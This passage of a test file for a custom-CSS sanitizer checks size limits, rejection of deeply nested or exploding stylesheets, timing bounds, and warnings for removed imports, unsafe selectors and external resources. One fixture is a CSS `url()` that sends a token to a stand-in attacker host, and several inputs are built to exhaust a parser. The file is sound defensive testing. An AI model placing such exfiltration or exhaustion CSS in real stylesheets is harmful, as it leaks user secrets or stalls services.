      expect.objectContaining({ code: "output_too_large", appearance: "light" }),
    ]);

    // Each field fits on its own; together they do not.
    let half = "";
    for (let i = 0; half.length < CUSTOM_CSS_MAX_SOURCE_BYTES.survey / 4; i++) half += `.a${i}{--x:${i}}\n`;
    expect(reject(half, half).errors).toEqual([
      expect.objectContaining({ code: "output_too_large", appearance: null, line: null }),
    ]);
  });

  test.each([
    ["deep nesting", ".a{".repeat(10_000) + "}".repeat(10_000)],
    ["deep functions", `.a{width:${"calc(".repeat(10_000)}1px${")".repeat(10_000)}}`],
    ["deep :is()", `${":is(".repeat(10_000)}.a${")".repeat(10_000)}{color:red}`],
    ["deep brackets in a custom property", `.a{--x:${"[{(".repeat(5_000)}}`],
    ["deep nesting hidden behind url(/*)", `.a{b:url(/*)}${".a{".repeat(10_000)}`],
    ["many rules", `.a{b:c}`.repeat(CUSTOM_CSS_MAX_RULES + 1)],
    ["a huge selector list", `${Array.from({ length: 5_000 }, (_, i) => `.s${i}`).join(",")}{color:red}`],
    ["a huge :is() list", `:is(${Array.from({ length: 1_000 }, (_, i) => `.s${i}`).join(",")}){color:red}`],
    ["a long selector", `${Array.from({ length: 40 }, (_, i) => `.s${i}`).join(" ")}{color:red}`],
    ["a universal chain", "#fbjs * * * *:not(.x) { outline: 0 }"],
    ["a universal chain built by nesting", "* { * { * { color: red } } }"],
  ])("rejects %s quickly with limit_exceeded", (_, source) => {
    const start = performance.now();
    const result = run(source, null, "workspace");
    expect(performance.now() - start).toBeLessThan(2_000);
    expect(result.ok || result.errors[0].code).toBe("limit_exceeded");
    expect(result.ok).toBe(false);
  });

  test("bounds nesting expansion before printing it", () => {
    // Each level's `&` repeats the whole parent list: 8 levels of 8 selectors would print 8^8 copies.
    const list = Array.from({ length: 8 }, (_, i) => `.s${i}`).join(",");
    const source = `${list}{`.repeat(8) + "color:red" + "}".repeat(8);
    const start = performance.now();
    const result = run(source, null, "workspace");
    expect(performance.now() - start).toBeLessThan(2_000);
    expect(result.ok || result.errors[0].code).toBe("output_too_large");
  });

  test("accepts `.question *` and other single universal steps", () => {
    expect(compile(".question * { font-family: Inter } #fbjs > * + * { margin-top: 4px }").warnings).toEqual(
      []
    );
  });

  test("processes a full-size stylesheet in well under a second", () => {
    const rule = (i: number) =>
      `[data-fb-part="option"].o${i}:hover { color: #123456; background: linear-gradient(red, blue); border-radius: ${i}px }\n`;
    let source = "";
    for (let i = 0; source.length < CUSTOM_CSS_MAX_SOURCE_BYTES.workspace / 2; i++) source += rule(i);
    const start = performance.now();
    const result = run(source, null, "workspace");
    expect(performance.now() - start).toBeLessThan(1_000);
    expect(result.ok).toBe(true);
  });
});

describe("warnings", () => {
  test("point at the removed construct in its own field, 1-based", () => {
    const result = compile(
      '@import url("https://fonts.example/inter.css");\n.a { color: red }\n\n  :root ~ .x { color: red }',
      ".b { color: red }\n.c {\n  color: red;\n  background: url(https://evil.example/?token=SECRET123);\n}\n.d { & { position: fixed } }"
    );
    expect(result.warnings).toEqual([
      expect.objectContaining({ code: "import_removed", appearance: "light", line: 1, column: 1 }),
      expect.objectContaining({ code: "unsafe_selector_removed", appearance: "light", line: 4, column: 3 }),
      expect.objectContaining({ code: "external_resource_removed", appearance: "dark", line: 4, column: 15 }),
      expect.objectContaining({ code: "fixed_position_removed", appearance: "dark", line: 6, column: 6 }),
    ]);
    expect(result.warnings.every((warning) => warning.scope === "survey")).toBe(true);
    expect(JSON.stringify(result.warnings)).not.toMatch(/SECRET|evil|fonts\.example/);
  });

  test(`lists at most ${CUSTOM_CSS_MAX_WARNINGS} warnings and still removes everything`, () => {
    const source = Array.from({ length: 150 }, (_, i) => `.a${i} { background: url(x${i}.png) }`).join("\n");
    const result = compile(source, null, "workspace");
    expect(result.warnings).toHaveLength(CUSTOM_CSS_MAX_WARNINGS);
    expect(result.compiled.light).toBe("@layer fb-workspace{}");
  });
});

describe("normalizeCustomCssInput", () => {
  test("trims fields, maps empty fields to null and no CSS at all to null", () => {
    expect(normalizeCustomCssInput(null)).toBeNull();
    expect(normalizeCustomCssInput(undefined)).toBeNull();
    expect(normalizeCustomCssInput({ light: "  ", dark: null })).toBeNull();
    expect(normalizeCustomCssInput({ light: "\n.a{}\n", dark: " " })).toEqual({ light: ".a{}", dark: null });
    expect(normalizeCustomCssInput({ light: null, dark: ".b{}" })).toEqual({ light: null, dark: ".b{}" });
  });
});
